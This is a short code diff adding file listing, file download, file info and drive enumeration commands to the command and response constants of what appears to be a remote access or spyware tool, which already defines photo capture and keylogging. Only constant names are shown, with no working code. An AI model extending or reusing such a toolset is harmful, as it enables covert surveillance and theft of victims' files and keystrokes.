@@ -62,6 +62,10 @@ class Commands:
     PHOTO = "photo"
     KEYLOG_START = "keylog_start"
     KEYLOG_STOP = "keylog_stop"
+    FILE_LIST = "file_list"
+    FILE_DOWNLOAD = "file_download"
+    FILE_INFO = "file_info"
+    GET_DRIVES = "get_drives"
     QUIT = "quit"
 
 # Response types
@@ -72,4 +76,8 @@ class ResponseTypes:
     PHOTO = "photo"
     KEYLOG_DATA = "keylog_data"
     KEYLOG_STATUS = "keylog_status"
+    FILE_LIST = "file_list"
+    FILE_DOWNLOAD = "file_download"
+    FILE_INFO = "file_info"
+    DRIVES_LIST = "drives_list"
     ERROR = "error" 
